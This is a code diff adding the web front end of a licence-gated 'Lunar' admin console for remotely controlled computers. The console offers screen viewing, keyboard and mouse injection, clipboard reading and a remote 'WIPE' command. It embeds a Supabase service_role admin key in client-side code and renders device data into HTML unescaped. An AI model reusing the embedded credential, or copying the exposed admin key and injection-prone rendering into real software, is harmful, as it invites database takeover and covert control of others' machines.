+                <button id="modalGetClipboard" class="btn-slate" style="padding:8px 16px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;font-family:Inter,sans-serif"><i class="fas fa-download"></i> GET CLIPBOARD</button>
+                <button id="modalSendText" class="btn-slate" style="padding:8px 16px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;font-family:Inter,sans-serif"><i class="fas fa-keyboard"></i> SEND TEXT</button>
+            </div>
+            <div id="modalStatus" style="font-size:12px;color:var(--lunar-text-muted);margin-top:8px">● LIVE</div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== MODAL: LICENSE DIALOG ===== -->
+<div id="licenseModal" class="modal-overlay">
+    <div class="modal-content" style="max-width:520px">
+        <div class="modal-header">
+            <div class="title" id="licenseModalTitle"><i class="fas fa-key"></i> Create License</div>
+            <button class="close" id="licenseModalClose">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div style="margin-bottom:12px">
+                <label style="font-size:10px;font-weight:700;color:var(--lunar-text-muted);text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:4px">LICENSE KEY</label>
+                <input id="licenseModalKey" type="text" style="width:100%;padding:10px 12px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:8px;color:var(--lunar-text-primary);font-size:14px;font-family:'SF Mono','Consolas',monospace;outline:none">
+                <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;align-items:center">
+                    <span style="font-size:11px;color:var(--lunar-text-muted)">Prefix:</span>
+                    <input id="licensePrefix" type="text" value="LUNAR" style="width:70px;padding:5px 8px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:6px;color:var(--lunar-text-primary);font-size:12px;font-family:'SF Mono',monospace;outline:none">
+                    <span style="font-size:11px;color:var(--lunar-text-muted)">Groups:</span>
+                    <input id="licenseGroups" type="number" value="3" min="1" max="10" style="width:45px;padding:5px 8px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:6px;color:var(--lunar-text-primary);font-size:12px;font-family:'SF Mono',monospace;outline:none">
+                    <span style="font-size:11px;color:var(--lunar-text-muted)">Len:</span>
+                    <input id="licenseLen" type="number" value="6" min="1" max="32" style="width:45px;padding:5px 8px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:6px;color:var(--lunar-text-primary);font-size:12px;font-family:'SF Mono',monospace;outline:none">
+                    <button id="licenseGenerateBtn" style="padding:5px 12px;border:none;border-radius:6px;font-size:10px;font-weight:700;cursor:pointer;background:var(--lunar-accent-blue);color:#fff;font-family:Inter,sans-serif">AUTO</button>
+                    <button id="licenseRandomBtn" style="padding:5px 12px;border:none;border-radius:6px;font-size:10px;font-weight:700;cursor:pointer;background:#334155;color:#fff;font-family:Inter,sans-serif">RANDOM</button>
+                </div>
+            </div>
+
+            <div style="margin-bottom:12px">
+                <label style="font-size:10px;font-weight:700;color:var(--lunar-text-muted);text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:4px">EXPIRY DATE & TIME (local)</label>
+                <input id="licenseExpiry" type="text" placeholder="YYYY-MM-DD HH:MM" style="width:100%;padding:10px 12px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:8px;color:var(--lunar-text-primary);font-size:14px;font-family:'SF Mono','Consolas',monospace;outline:none">
+                <div style="display:flex;gap:4px;margin-top:6px;flex-wrap:wrap">
+                    <button class="quick-expiry" data-hours="1" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+1h</button>
+                    <button class="quick-expiry" data-hours="6" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+6h</button>
+                    <button class="quick-expiry" data-hours="24" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+1d</button>
+                    <button class="quick-expiry" data-hours="168" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+7d</button>
+                    <button class="quick-expiry" data-hours="720" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+30d</button>
+                    <button class="quick-expiry" data-hours="8760" style="padding:4px 10px;border:1px solid var(--lunar-border);border-radius:6px;background:transparent;color:var(--lunar-text-secondary);font-size:10px;cursor:pointer;font-family:Inter,sans-serif">+1y</button>
+                </div>
+            </div>
+
+            <div style="margin-bottom:12px">
+                <label style="font-size:10px;font-weight:700;color:var(--lunar-text-muted);text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:4px">NOTES / DESCRIPTION</label>
+                <textarea id="licenseNotes" rows="3" style="width:100%;padding:10px 12px;background:var(--lunar-bg-input);border:1px solid var(--lunar-border);border-radius:8px;color:var(--lunar-text-primary);font-size:13px;font-family:Inter,sans-serif;outline:none;resize:vertical"></textarea>
+            </div>
+
+            <label style="display:flex;align-items:center;gap:8px;font-size:13px;font-weight:700;color:var(--lunar-online);cursor:pointer;margin-bottom:12px">
+                <input type="checkbox" id="licenseActive" checked style="width:18px;height:18px;accent-color:var(--lunar-accent-green)"> License is ACTIVE
+            </label>
+
+            <div style="display:flex;gap:8px;justify-content:flex-end;flex-wrap:wrap">
+                <button id="licenseCancelBtn" class="btn-slate" style="padding:10px 24px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;font-family:Inter,sans-serif">CANCEL</button>
+                <button id="licenseSaveBtn" class="btn-green" style="padding:10px 24px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;font-family:Inter,sans-serif">CREATE LICENSE</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// LUNAR ADMIN CONSOLE — COMPLETE JAVASCRIPT
+// ============================================================
+
+// ==================== CONFIGURATION ====================
+const LUNAR_USER_SUPABASE_URL = "https://nvuciqpapigopcgiqqwp.supabase.co";
+const LUNAR_USER_SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im52dWNpcXBhcGlnb3BjZ2lxcXdwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAxODY2NjUsImV4cCI6MjEwNTc2MjY2NX0.Xqj1AFYsdLIY7G4eQviaa9O2DcWH7Si8A6lmyMEa0KU";
+
+const LUNAR_SUPABASE_URL = "https://lqbakrvrluhruejxmjiy.supabase.co";
+const LUNAR_SUPABASE_ADMIN_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxxYmFrcnZybHVocnVlanhtaml5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MDE4NTcxMiwiZXhwIjoyMTA1NzYxNzEyfQ.eyCoOqSgA3Fsahm5Gk_vi0dE1hGu3XLd3tlqCFOjMB4";
+
+const LUNAR_REFRESH_SECONDS = 5;
+const LUNAR_ONLINE_TIMEOUT_SECONDS = 15;
+const LUNAR_SCREEN_BUCKET = "lunar_screens";
+
+// ==================== STATE ====================
+let state = {
+    license: null,
+    expires: null,
+    deviceId: null,
+    computerName: "—",
+    publicIp: "—",
+    loggedIn: false,
+    devices: {},
+    licenses: {},
+    screenWindows: {},
+    refreshTimer: null,
+    heartbeatTimer: null,
+    licenseCheckTimer: null,
+    expandedDevices: new Set(),
+    expandedLicenses: new Set(),
+    autoDeletedLicenses: new Set(),
+    lunarReady: true,
+    refreshInFlight: false,
+    generatedLicense: "",
+};
+
+// ==================== UTILITIES ====================
+function uuidv4() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        const r = Math.random() * 16 | 0;
+        const v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+    });
+}
+
+function safeText(value) {
+    if (value === null || value === undefined) return '';
+    try { return String(value).trim(); } catch { return ''; }
+}
+
+function parseDateTime(value) {
+    if (!value) return null;
+    try {
+        let text = String(value);
+        if (text.endsWith('Z')) text = text.slice(0, -1) + '+00:00';
+        const dt = new Date(text);
+        if (isNaN(dt.getTime())) return null;
+        return dt;
+    } catch { return null; }
+}
+
+function formatTime(value) {
+    if (!value) return '—';
+    const dt = parseDateTime(value);
+    if (!dt) return String(value);
+    try {
+        return dt.toLocaleString('en-GB', {
+            day: '2-digit', month: '2-digit', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
+        });
+    } catch { return String(value); }
+}
+
+function humanizeSeconds(totalSeconds) {
+    try { totalSeconds = Math.floor(totalSeconds); } catch { return '—'; }
+    const abs = Math.abs(totalSeconds);
+    const days = Math.floor(abs / 86400);
+    const hours = Math.floor((abs % 86400) / 3600);
+    const minutes = Math.floor((abs % 3600) / 60);
+    const seconds = abs % 60;
+    const parts = [];
+    if (days) parts.push(days + 'd');
+    if (hours || days) parts.push(hours + 'h');
+    if (minutes || hours || days) parts.push(minutes + 'm');
+    parts.push(seconds + 's');
+    return (totalSeconds < 0 ? '-' : '') + parts.join(' ');
+}
+
+function licenseTimeLeft(licenseItem) {
+    const expiresAt = parseDateTime(licenseItem.expires_at);
+    if (!expiresAt) return { status: 'unknown', seconds: null, text: 'No expiry' };
+    const now = new Date();
+    const secondsLeft = (expiresAt - now) / 1000;
+    if (secondsLeft <= 0) return { status: 'expired', seconds: secondsLeft, text: 'EXPIRED ' + humanizeSeconds(secondsLeft) + ' ago' };
+    if (secondsLeft < 86400) return { status: 'expiring', seconds: secondsLeft, text: humanizeSeconds(secondsLeft) + ' left' };
+    return { status: 'active', seconds: secondsLeft, text: humanizeSeconds(secondsLeft) + ' left' };
+}
+
+function isDeviceOnline(device) {
+    if (!device) return false;
+    const lastSeen = device.last_seen_at;
+    if (!lastSeen) return false;
+    const dt = parseDateTime(lastSeen);
+    if (!dt) return false;
+    const now = new Date();
+    return (now - dt) / 1000 <= LUNAR_ONLINE_TIMEOUT_SECONDS;
+}
+
+function makeCommandId() {
+    return Date.now();
+}
+
+function isoNow() {
+    return new Date().toISOString();
+}
+
+function generateLicenseKey(prefix, groups, groupLength) {
+    prefix = (prefix || 'LUNAR').toUpperCase().replace(/[^A-Z0-9-]/g, '');
+    if (!prefix) prefix = 'LUNAR';
+    groups = Math.max(1, Math.min(10, parseInt(groups) || 3));
+    groupLength = Math.max(1, Math.min(32, parseInt(groupLength) || 6));
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const parts = [];
+    for (let i = 0; i < groups; i++) {
+        let part = '';
+        for (let j = 0; j < groupLength; j++) {
+            part += alphabet[Math.floor(Math.random() * alphabet.length)];
+        }
+        parts.push(part);
+    }
+    return prefix + '-' + parts.join('-');
+}
+
+function parseUserDateTime(text) {
+    text = safeText(text);
+    if (!text) throw new Error('Empty date/time');
+    const formats = [
+        /^(\d{4})-(\d{2})-(\d{2})[ T](\d{2}):(\d{2})/,
+        /^(\d{2})-(\d{2})-(\d{4})[ T](\d{2}):(\d{2})/,
+        /^(\d{2})\/(\d{2})\/(\d{4})[ T](\d{2}):(\d{2})/,
+    ];
+    for (const re of formats) {
+        const m = text.match(re);
+        if (m) {
+            let y, mo, d, h, mi;
+            if (re.source.indexOf('\\d{4}') === 1) {
+                [, y, mo, d, h, mi] = m;
+            } else if (re.source.indexOf('\\d{2}-\\d{2}-\\d{4}') === 1) {
+                [, d, mo, y, h, mi] = m;
+            } else {
+                [, d, mo, y, h, mi] = m;
+            }
+            const dt = new Date(y, mo - 1, d, h, mi, 0);
+            if (!isNaN(dt.getTime())) return dt.toISOString();
+        }
+    }
+    throw new Error('Invalid date/time format. Use: YYYY-MM-DD HH:MM');
+}
+
+// ==================== API HELPERS ====================
+async function supabaseFetch(url, options = {}) {
+    const headers = {
+        'apikey': LUNAR_SUPABASE_ADMIN_KEY,
+        'Authorization': `Bearer ${LUNAR_SUPABASE_ADMIN_KEY}`,
+        'Content-Type': 'application/json',
+        ...options.headers,
+    };
+    const response = await fetch(url, { ...options, headers });
+    if (!response.ok) {
+        const text = await response.text();
+        throw new Error(`HTTP ${response.status}: ${text.slice(0, 500)}`);
+    }
+    const text = await response.text();
+    if (!text) return null;
+    try { return JSON.parse(text); } catch { return text; }
+}
+
+async function supabaseRpc(fn, params = {}, url = LUNAR_SUPABASE_URL, key = LUNAR_SUPABASE_ADMIN_KEY) {
+    const res = await fetch(`${url}/rest/v1/rpc/${fn}`, {
+        method: 'POST',
+        headers: {
+            'apikey': key,
+            'Authorization': `Bearer ${key}`,
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(params),
+    });
+    if (!res.ok) {
+        const text = await res.text();
+        throw new Error(`RPC ${fn} failed: ${res.status} ${text.slice(0, 300)}`);
+    }
+    const text = await res.text();
+    if (!text) return null;
+    try { return JSON.parse(text); } catch { return text; }
+}
+
+async function fetchDevices() {
+    const data = await supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_devices?select=*&order=last_seen_at.desc`);
+    return data || [];
+}
+
+async function fetchLicenses() {
+    const data = await supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_licenses?select=*&order=created_at.desc`);
+    return data || [];
+}
+
+async function createLicense(payload) {
+    return supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_licenses`, {
+        method: 'POST',
+        headers: { 'Prefer': 'return=representation' },
+        body: JSON.stringify(payload),
+    });
+}
+
+async function updateLicense(key, payload) {
+    return supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_licenses?license_key=eq.${encodeURIComponent(key)}`, {
+        method: 'PATCH',
+        headers: { 'Prefer': 'return=representation' },
+        body: JSON.stringify(payload),
+    });
+}
+
+async function deleteLicense(key) {
+    return supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_licenses?license_key=eq.${encodeURIComponent(key)}`, {
+        method: 'DELETE',
+    });
+}
+
+async function updateDevice(deviceId, payload) {
+    return supabaseFetch(`${LUNAR_SUPABASE_URL}/rest/v1/lunar_devices?device_id=eq.${encodeURIComponent(deviceId)}`, {
+        method: 'PATCH',
+        headers: { 'Prefer': 'return=representation' },
+        body: JSON.stringify(payload),
+    });
+}
+
+async function setScreenView(deviceId, active) {
+    return supabaseRpc('lunar_set_screen_view', {
+        p_device_id: deviceId,
+        p_active: active,
+    });
+}
+
+async function setControl(deviceId, enabled) {
+    return supabaseRpc('lunar_set_control', {
+        p_device_id: deviceId,
+        p_enabled: enabled,
+    });
+}
+
+async function sendInput(deviceId, params) {
+    return supabaseRpc('lunar_send_input', {
+        p_device_id: deviceId,
+        p_mouse_x: params.mouse_x || 0,
+        p_mouse_y: params.mouse_y || 0,
+        p_mouse_action: params.action || '',
+        p_mouse_button: params.button || '',
+        p_scroll_delta: params.scroll || 0,
+        p_key_text: params.key_text || '',
+        p_hotkey_text: params.hotkey || '',
+    });
+}
+
+async function sendClipboard(deviceId, text, direction) {
+    return supabaseRpc('lunar_send_clipboard', {
+        p_device_id: deviceId,
+        p_text: text,
+        p_direction: direction,
+    });
+}
+
+// ==================== LOGIN GATE ====================
+async function getPublicIp() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
+        const data = await r.json();
+        return data.ip || '—';
+    } catch { return '—'; }
+}
+
+function getComputerName() {
+    try {
+        return navigator.userAgent.split(')')[0].split('(')[1] || 'Web Browser';
+    } catch { return 'Web Browser'; }
+}
+
+function getOrCreateDeviceId() {
+    let id = localStorage.getItem('lunar_admin_device_id');
+    if (!id) {
+        id = uuidv4();
+        localStorage.setItem('lunar_admin_device_id', id);
+    }
+    return id;
+}
+
+async function initLoginGate() {
+    state.deviceId = getOrCreateDeviceId();
+    state.computerName = getComputerName();
+
+    document.getElementById('loginComputerName').textContent = state.computerName;
+    document.getElementById('loginDeviceId').textContent = state.deviceId.slice(0, 18) + '…';
+
+    // Load public IP
+    const ip = await getPublicIp();
+    state.publicIp = ip;
+    document.getElementById('loginPublicIp').textContent = ip;
+
+    // Register device
+    try {
+        await supabaseRpc('lunar_register_device', {
+            p_device_id: state.deviceId,
+            p_computer_name: state.computerName,
+            p_public_ip: state.publicIp,
+        }, LUNAR_USER_SUPABASE_URL, LUNAR_USER_SUPABASE_ANON_KEY);
+        document.getElementById('loginStatusSub').textContent = 'Connected to server';
+    } catch (e) {
+        document.getElementById('loginStatusSub').textContent = 'Server connection error';
+        console.error('Register error:', e);
+    }
+}
+
+async function attemptLogin() {
+    const licenseKey = document.getElementById('licenseInput').value.trim();
+    if (!licenseKey) {
+        alert('Please enter a license key.');
+        return;
+    }
+
+    const btn = document.getElementById('loginBtn');
+    btn.disabled = true;
+    document.getElementById('loginStatusMsg').textContent = 'Logging in…';
+    document.getElementById('loginStatusMsg').style.color = 'var(--lunar-warning)';
+
+    try {
+        const result = await supabaseRpc('lunar_login', {
+            p_license_key: licenseKey,
+            p_device_id: state.deviceId,
+            p_computer_name: state.computerName,
+            p_public_ip: state.publicIp,
+        }, LUNAR_USER_SUPABASE_URL, LUNAR_USER_SUPABASE_ANON_KEY);
+
+        if (result && result.success === false) {
+            throw new Error(result.message || 'Login failed');
+        }
+        if (result === false) throw new Error('Login rejected by server.');
+
+        // Success
+        state.license = licenseKey;
+        state.expires = result?.expires_at || null;
+        state.loggedIn = true;
+
+        document.getElementById('loginStatusMsg').textContent = 'Login successful!';
+        document.getElementById('loginStatusMsg').style.color = 'var(--lunar-online)';
+
+        // Hide gate, show console
+        document.getElementById('loginGate').classList.add('hidden');
+        document.getElementById('console').classList.add('visible');
+
+        // Start heartbeat + license check
+        startHeartbeat();
+        startLicenseCheck();
+        startLunarRefresh();
+
+        // Initialize lunar panel
+        await refreshLunarData();
+
+    } catch (e) {
+        document.getElementById('loginStatusMsg').textContent = 'Login failed: ' + e.message;
+        document.getElementById('loginStatusMsg').style.color = 'var(--lunar-offline)';
+        alert('Login failed: ' + e.message);
+    } finally {
+        btn.disabled = false;
+    }
+}
+
+function startHeartbeat() {
+    if (state.heartbeatTimer) clearInterval(state.heartbeatTimer);
+    state.heartbeatTimer = setInterval(async () => {
+        try {
+            const result = await supabaseRpc('lunar_heartbeat', {
+                p_device_id: state.deviceId,
+                p_computer_name: state.computerName,
+                p_public_ip: state.publicIp,
+            }, LUNAR_USER_SUPABASE_URL, LUNAR_USER_SUPABASE_ANON_KEY);
+
+            if (result && result.forced_logout) {
+                forcedLogout('License is inactive');
+            }
+        } catch (e) { console.error('Heartbeat error:', e); }
+    }, 5000);
+}
+
+function startLicenseCheck() {
+    if (state.licenseCheckTimer) clearInterval(state.licenseCheckTimer);
+    state.licenseCheckTimer = setInterval(async () => {
+        if (!state.loggedIn || !state.license) return;
+        try {
+            const data = await supabaseFetch(
+                `${LUNAR_USER_SUPABASE_URL}/rest/v1/lunar_licenses?select=license_key,is_active,expires_at&license_key=eq.${encodeURIComponent(state.license)}`,
+                { headers: { 'apikey': LUNAR_USER_SUPABASE_ANON_KEY, 'Authorization': `Bearer ${LUNAR_USER_SUPABASE_ANON_KEY}` } }
+            );
+            const rows = Array.isArray(data) ? data : [];
+            if (rows.length === 0) { forcedLogout('License removed'); return; }
+            const row = rows[0];
+            if (!row.is_active) { forcedLogout('License is inactive'); return; }
+            const expires = parseDateTime(row.expires_at);
+            if (expires && expires < new Date()) { forcedLogout('License expired'); return; }
+        } catch (e) { console.error('License check error:', e); }
+    }, 30000);
+}
+
+function forcedLogout(reason) {
+    state.loggedIn = false;
+    if (state.heartbeatTimer) clearInterval(state.heartbeatTimer);
+    if (state.licenseCheckTimer) clearInterval(state.licenseCheckTimer);
+    if (state.refreshTimer) clearInterval(state.refreshTimer);
+    alert('Session ended: ' + reason);
+    document.getElementById('loginGate').classList.remove('hidden');
+    document.getElementById('console').classList.remove('visible');
+}
+
+function logout() {
+    if (!confirm('Log out and close the admin console?\n\nYou will need to enter a license key again.')) return;
+    try {
+        supabaseRpc('lunar_logout', {
+            p_device_id: state.deviceId,
+            p_license_key: state.license || '',
+        }, LUNAR_USER_SUPABASE_URL, LUNAR_USER_SUPABASE_ANON_KEY).catch(() => {});
+    } catch (e) { /* ignore */ }
+    state.loggedIn = false;
+    if (state.heartbeatTimer) clearInterval(state.heartbeatTimer);
+    if (state.licenseCheckTimer) clearInterval(state.licenseCheckTimer);
+    if (state.refreshTimer) clearInterval(state.refreshTimer);
+    document.getElementById('loginGate').classList.remove('hidden');
+    document.getElementById('console').classList.remove('visible');
+    document.getElementById('licenseInput').value = '';
+    document.getElementById('loginStatusMsg').textContent = 'Waiting for license…';
+    document.getElementById('loginStatusMsg').style.color = 'var(--lunar-warning)';
+}
+
+// ==================== LUNAR PANEL ====================
+async function refreshLunarData() {
+    if (state.refreshInFlight) return;
+    state.refreshInFlight = true;
+    try {
+        const [devices, licenses] = await Promise.all([
+            fetchDevices(),
+            fetchLicenses(),
+        ]);
+
+        // Filter online devices
+        const onlineDevices = {};
+        for (const d of devices) {
+            if (d && d.device_id && isDeviceOnline(d)) {
+                onlineDevices[d.device_id] = d;
+            }
+        }
+
+        const licenseMap = {};
+        for (const l of licenses) {
+            if (l && l.license_key) {
+                licenseMap[l.license_key] = l;
+            }
+        }
+
+        state.devices = onlineDevices;
+        state.licenses = licenseMap;
+
+        renderDevices();
+        renderLicenses();
+
+        document.getElementById('statOnlineCount').textContent = Object.keys(onlineDevices).length;
+        document.getElementById('statLicenseCount').textContent = Object.keys(licenseMap).length;
+        document.getElementById('lunarRefreshTime').textContent = 'Updated ' + new Date().toLocaleTimeString();
+
+        // Check expired licenses
+        checkExpiredLicenses();
+
+    } catch (e) {
+        console.error('Lunar refresh error:', e);
+        addLog('Refresh error: ' + e.message);
+    } finally {
+        state.refreshInFlight = false;
+    }
+}
+
+function startLunarRefresh() {
+    if (state.refreshTimer) clearInterval(state.refreshTimer);
+    state.refreshTimer = setInterval(() => {
+        refreshLunarData();
+    }, LUNAR_REFRESH_SECONDS * 1000);
+}
+
+function renderDevices() {
+    const container = document.getElementById('deviceGrid');
+    const ids = Object.keys(state.devices);
+    if (ids.length === 0) {
+        container.innerHTML = `<div class="empty-state"><i class="fas fa-desktop"></i><br>No online computers right now.<br><span style="font-size:12px">Start user.py on a computer and it will appear here.</span></div>`;
+        return;
+    }
+
+    let html = '';
+    const sorted = ids.sort((a, b) => {
+        const na = (state.devices[a].computer_name || '').toLowerCase();
+        const nb = (state.devices[b].computer_name || '').toLowerCase();
+        return na.localeCompare(nb);
+    });
+
+    for (const id of sorted) {
+        const d = state.devices[id];
+        const name = safeText(d.computer_name) || 'Unknown Computer';
+        const ip = safeText(d.public_ip) || '—';
+        const licenseKey = safeText(d.license_key) || 'Not logged in';
+        const lastSeen = formatTime(d.last_seen_at);
+        const cmdStatus = safeText(d.command_status) || '—';
+        const cmdMsg = safeText(d.command_message) || '';
+        const isExpanded = state.expandedDevices.has(id);
+
+        // Get active licenses for this device
+        const activeLicenses = Object.keys(state.licenses).filter(k => {
+            const l = state.licenses[k];
+            return l.is_active && licenseTimeLeft(l).status !== 'expired';
+        });
+
+        let licenseOptions = activeLicenses.map(k =>
+            `<option value="${k}" ${k === licenseKey ? 'selected' : ''}>${k}</option>`
+        ).join('');
+
+        html += `
+        <div class="device-card" data-device-id="${id}">
+            <div class="card-header" onclick="toggleDevice('${id}')">
+                <span class="expand ${isExpanded ? 'open' : ''}">▼</span>
+                <span class="name">${name}</span>
+                <span class="badge">● ONLINE</span>
+                <span class="ip">IP: ${ip}</span>
+                <div class="actions" onclick="event.stopPropagation()">
+                    <button class="btn-purple" onclick="openScreenViewer('${id}')"><i class="fas fa-desktop"></i> VIEW</button>
+                    <button class="btn-wipe" onclick="wipeComputer('${id}')"><i class="fas fa-skull"></i> WIPE</button>
+                    <button class="btn-green" onclick="loginDevice('${id}')"><i class="fas fa-sign-in-alt"></i> LOGIN</button>
+                    <button class="btn-red" onclick="logoutDevice('${id}')"><i class="fas fa-sign-out-alt"></i> LOGOUT</button>
+                </div>
+            </div>
+            <div class="card-body ${isExpanded ? 'open' : ''}">
+                <div class="field-grid">
+                    <div class="field">
+                        <div class="label">License</div>
+                        <div class="value mono ${licenseKey !== 'Not logged in' ? 'online' : ''}">${licenseKey}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Device ID</div>
+                        <div class="value mono" style="font-size:11px;color:var(--lunar-text-secondary)">${id}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Last Seen</div>
+                        <div class="value">${lastSeen}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Command Status</div>
+                        <div class="value" style="color:var(--lunar-accent-orange)">${cmdStatus}${cmdMsg ? ' • ' + cmdMsg : ''}</div>
+                    </div>
+                </div>
+                <div class="license-selector">
+                    <select id="licenseSelect-${id}">
+                        <option value="">— Select license —</option>
+                        ${licenseOptions}
+                    </select>
+                    <button onclick="loginDevice('${id}', document.getElementById('licenseSelect-${id}').value)"><i class="fas fa-sign-in-alt"></i> LOGIN WITH SELECTED</button>
+                </div>
+            </div>
+        </div>`;
+    }
+    container.innerHTML = html;
+}
+
+function toggleDevice(deviceId) {
+    if (state.expandedDevices.has(deviceId)) {
+        state.expandedDevices.delete(deviceId);
+    } else {
+        state.expandedDevices.add(deviceId);
+    }
+    renderDevices();
+}
+
+function renderLicenses() {
+    const container = document.getElementById('licenseGrid');
+    const keys = Object.keys(state.licenses);
+    if (keys.length === 0) {
+        container.innerHTML = `<div class="empty-state"><i class="fas fa-key"></i><br>No licenses yet.<br><span style="font-size:12px">Click 'CREATE NEW LICENSE' to add one.</span></div>`;
+        return;
+    }
+
+    let html = '';
+    const sorted = keys.sort((a, b) => {
+        const la = state.licenses[a], lb = state.licenses[b];
+        return (lb.created_at || '').localeCompare(la.created_at || '');
+    });
+
+    for (const key of sorted) {
+        const l = state.licenses[key];
+        const isActive = l.is_active;
+        const timeLeft = licenseTimeLeft(l);
+        const statusText = timeLeft.status === 'expired' ? 'EXPIRED' :
+                           !isActive ? 'RESTRICTED' :
+                           timeLeft.status === 'expiring' ? 'EXPIRING' : 'ACTIVE';
+        const statusClass = timeLeft.status === 'expired' ? 'expired' :
+                            !isActive ? 'offline' :
+                            timeLeft.status === 'expiring' ? 'expiring' : 'online';
+        const isExpanded = state.expandedLicenses.has(key);
+
+        html += `
+        <div class="license-card" data-license-key="${key}">
+            <div class="card-header" onclick="toggleLicense('${key}')">
+                <span class="expand ${isExpanded ? 'open' : ''}">▼</span>
+                <span class="name mono" style="font-size:12px">${key}</span>
+                <span class="badge" style="background:${statusClass === 'online' ? 'rgba(74,222,128,0.15)' : statusClass === 'expired' ? 'rgba(220,38,38,0.15)' : statusClass === 'expiring' ? 'rgba(250,204,21,0.15)' : 'rgba(248,113,113,0.15)'};color:var(--lunar-${statusClass})">${statusText}</span>
+                <span style="font-size:11px;color:var(--lunar-text-muted);margin-left:auto">${timeLeft.text}</span>
+                <div class="actions" onclick="event.stopPropagation()">
+                    <button class="btn-green" onclick="setLicenseActive('${key}', true)"><i class="fas fa-check"></i> ACTIVATE</button>
+                    <button class="btn-orange" onclick="setLicenseActive('${key}', false)"><i class="fas fa-ban"></i> RESTRICT</button>
+                    <button class="btn-slate" onclick="editLicense('${key}')"><i class="fas fa-edit"></i> EDIT</button>
+                    <button class="btn-wipe" onclick="deleteLicense('${key}')"><i class="fas fa-trash"></i> DELETE</button>
+                </div>
+            </div>
+            <div class="card-body ${isExpanded ? 'open' : ''}">
+                <div class="field-grid">
+                    <div class="field">
+                        <div class="label">Created</div>
+                        <div class="value">${formatTime(l.created_at)}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Updated</div>
+                        <div class="value">${formatTime(l.updated_at)}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Expires At</div>
+                        <div class="value">${formatTime(l.expires_at)}</div>
+                    </div>
+                    <div class="field">
+                        <div class="label">Time Remaining</div>
+                        <div class="value" style="font-weight:700;color:var(--lunar-${statusClass})">${timeLeft.text}</div>
+                    </div>
+                    <div class="field" style="grid-column:1/-1">
+                        <div class="label">Notes</div>
+                        <div class="value" style="color:var(--lunar-text-secondary)">${safeText(l.notes) || '—'}</div>
+                    </div>
+                </div>
+            </div>
+        </div>`;
+    }
+    container.innerHTML = html;
+}
+
+function toggleLicense(key) {
+    if (state.expandedLicenses.has(key)) {
+        state.expandedLicenses.delete(key);
+    } else {
+        state.expandedLicenses.add(key);
+    }
+    renderLicenses();
+}
+
+// ==================== DEVICE ACTIONS ====================
+async function sendDeviceCommand(deviceId, command, licenseKey) {
+    const device = state.devices[deviceId];
+    if (!device) { alert('Device not found.'); return; }
+
+    const name = safeText(device.computer_name) || 'Unknown';
+    const commandId = makeCommandId();
+    const message = command === 'login' ? 'Login command sent' :
+                    command === 'logout' ? 'Logout command sent' :
+                    command === 'wipe' ? 'Wipe command sent' : 'Command sent';
+
+    const payload = {
+        admin_command: command,
+        admin_license_key: command === 'login' ? licenseKey : '',
+        command_id: commandId,
+        command_created_at: isoNow(),
+        command_status: 'pending',
+        command_message: message,
+        updated_at: isoNow(),
+    };
+
+    try {
+        await updateDevice(deviceId, payload);
+        addLog(`${command.toUpperCase()} → ${name}`);
+    } catch (e) {
+        addLog(`Command error: ${e.message}`);
+        alert('Command error: ' + e.message);
+    }
+}
+
